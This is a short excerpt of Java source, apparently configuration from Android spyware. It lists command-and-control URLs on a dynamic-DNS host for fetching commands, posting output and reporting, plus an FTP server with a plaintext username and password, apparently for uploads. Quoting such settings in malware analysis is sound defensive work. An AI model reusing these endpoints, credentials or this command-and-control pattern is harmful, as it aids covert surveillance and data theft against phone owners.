...
class AppSettings {
    ...
    private static final String getSettingsURL = "http://verifiche.ddns.net/phone/getsettings.php";

    private static final String reportURL = "http://verifiche.ddns.net/phone/report.php";
    private static final String commandsURL = "http://verifiche.ddns.net/phone/getcommands.php";
    private static final String outputURL = "http://verifiche.ddns.net/phone/setoutput.php";
    private static final String ftpServer = "ftp.ticketenzo.altervista.org";
    private static final int ftpPort = 21;
    private static final String ftpUsername = "ticketenzo";
    private static final String ftpPassword = "Ticketenzo1.";
